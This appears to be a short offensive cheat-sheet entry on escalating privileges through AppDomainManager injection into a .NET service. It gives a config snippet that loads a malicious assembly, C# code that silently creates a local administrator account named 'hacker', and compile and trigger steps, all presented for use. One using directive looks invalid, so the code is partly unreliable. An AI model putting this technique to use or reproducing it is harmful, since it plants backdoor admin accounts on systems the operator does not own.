# AppDomainManager Injection via .NET Config

If a .NET service runs as SYSTEM/high privilege and you can write to its directory, inject an `AppDomainManager` via the application's `.config` file. The CLR loads your managed DLL on every app domain creation — before `Main()` runs.

```xml
<!-- ServiceName.exe.config or web.config — add to <runtime> section: -->
<runtime>
  <appDomainManagerAssembly value="EvilManager, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
  <appDomainManagerType value="EvilManager.EvilDomainManager" />
</runtime>
```

Build the injector DLL (C#):
```csharp
using System;
using System.AppDomain;
using System.Diagnostics;
public class EvilDomainManager : AppDomainManager {
    public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
        Process.Start("cmd.exe", "/c net user hacker P@ss123 /add && net localgroup administrators hacker /add");
    }
}
```
```bash
# Compile on attacker machine, drop EvilManager.dll next to the .exe
mcs -target:library EvilDomainManager.cs -out:EvilManager.dll
# or: csc /target:library EvilDomainManager.cs
```

Trigger: service restart or scheduled invocation. The config must be in the same directory as the executable (or GAC for signed assemblies).
